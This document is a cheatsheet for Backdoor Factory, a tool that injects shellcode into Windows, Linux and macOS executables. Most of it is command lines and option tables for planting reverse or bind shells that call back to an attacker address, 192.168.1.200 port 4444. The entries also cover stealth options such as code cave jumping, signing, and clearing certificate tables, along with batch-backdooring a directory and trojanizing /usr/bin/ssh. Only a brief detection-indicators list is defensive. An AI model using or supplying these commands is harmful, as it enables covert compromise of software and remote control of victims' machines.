# Backdoor Factory (BDF) — Cheatsheet

## Quick Reference

```bash
backdoor-factory -f <binary> -H <ip> -P <port> -s <payload> [options]
```

## Core Usage

```bash
# Basic reverse shell injection
backdoor-factory -f target.exe -H 192.168.1.200 -P 4444 -s reverse_shell_tcp_inline

# Inject with new section (more reliable)
backdoor-factory -f target.exe -H 192.168.1.200 -P 4444 -s reverse_shell_tcp -a

# Automatic patching (recommended)
backdoor-factory -f target.exe -H 192.168.1.200 -P 4444 -s iat_reverse_tcp_inline -m automatic

# Code cave jumping (stealthier)
backdoor-factory -f target.exe -H 192.168.1.200 -P 4444 -s reverse_shell_tcp -J

# User-supplied shellcode
msfvenom windows/exec CMD="calc.exe" -f raw > calc.bin
backdoor-factory -f target.exe -s user_supplied_shellcode -U calc.bin

# Batch directory backdooring
backdoor-factory -d /path/to/binaries/ -H 192.168.1.200 -P 4444 -s reverse_shell_tcp -a

# Code cave mining
backdoor-factory -f target.exe -c -l 500

# Support check (dry run)
backdoor-factory -f target.exe -S -v
```

## Payloads

| Payload | Arch | Description |
|---------|------|-------------|
| `reverse_shell_tcp` | x86/x64 | Reverse TCP shell |
| `reverse_shell_tcp_inline` | x86/x64 | Inline reverse shell |
| `reverse_tcp_stager_threaded` | x86/x64 | Threaded stager |
| `iat_reverse_tcp` | x86/x64 | IAT-based reverse TCP |
| `iat_reverse_tcp_inline` | x86/x64 | IAT inline reverse TCP |
| `reverse_tcp_x64` | x64 | 64-bit reverse TCP |
| `iat_reverse_tcp_x64` | x64 | 64-bit IAT reverse TCP |
| `bind_shell_tcp` | x86/x64 | Bind shell |
| `user_supplied_shellcode` | any | Custom shellcode via -U |

## Patching Methods

| Method | Flag | Use Case |
|--------|------|----------|
| Manual | `-m manual` | Interactive cave selection (default) |
| Automatic | `-m automatic` | Best cave selection (threaded payloads) |
| Replace | `-m replace` | Binary replacement (-b binary) |
| OnionDuke | `-m onionduke` | Resource section replacement |

## Code Cave Strategies

| Strategy | Key | Behavior |
|----------|-----|----------|
| Single | `s` | All shellcode in one cave |
| Jump | `j` | Split across caves with jumps |
| Append | `a` | Create new cave by appending |
| Ignore | `i`/`q` | Skip binary |

## Options

| Flag | Description | Default |
|------|-------------|---------|
| `-f FILE` | Target binary | Required |
| `-s SHELL` | Payload type | Required |
| `-H HOST` | C2 IP | Required |
| `-P PORT` | C2 port | Required |
| `-a` | Add new section | Off |
| `-J` | Cave jumping | Off |
| `-m METHOD` | Patch method | manual |
| `-C` | Code signing | Off |
| `-X` | XP support | Off |
| `-A` | IDT in cave (experimental) | Off |
| `-L` | Skip DLLs | Off |
| `-Z` | Zero cert table | Off |
| `-v` | Verbose | Off |
| `-o FILE` | Output filename | auto |
| `-w` | Section RWE | On |
| `-T TYPE` | ALL/x86/x64 filter | ALL |

## PE Code Signing Setup

```bash
echo -n "password" > certs/passFile.txt
cp signingCert.cer certs/signingCert.cer
cp signingPrivateKey.pem certs/signingPrivateKey.pem
backdoor-factory -f target.exe -s iat_reverse_tcp_inline -H 192.168.1.200 -P 4444 -m automatic -C
```

## ELF Injection

```bash
# ELF extends TEXT segment by 1000 bytes
backdoor-factory -f /usr/bin/ssh -H 192.168.1.200 -P 4444 -s reverse_shell_tcp -a
```

## Injector Module (Windows Only)

```bash
backdoor-factory -i -H 192.168.1.200 -P 4444 -s reverse_shell_tcp -a -u .bak
```

## Docker

```bash
docker pull secretsquirrel/the-backdoor-factory
docker run -it secretsquirrel/the-backdoor-factory bash
./backdoor.py -f target.exe -H 192.168.1.200 -P 4444 -s reverse_shell_tcp -a
```

## Supported Formats

- **PE**: x86/x64, UPX-packed, FAT binaries
- **ELF**: x86/x64, System V, FreeBSD, ARM LE x32
- **Mach-O**: x86/x64, FAT binaries
- **Experimental**: OpenBSD x32

## Limitations

- Some binaries have built-in protections — always test first
- Bound imports prevent PE patching
- NSIS installers not supported
- Architecture must match for user shellcode
- ELF injection extends TEXT segment (detectable)

## Detection Indicators

- Modified section permissions (RWE)
- New sections in PE files
- Altered entry point
- Cleared certificate table pointers
- Modified IAT
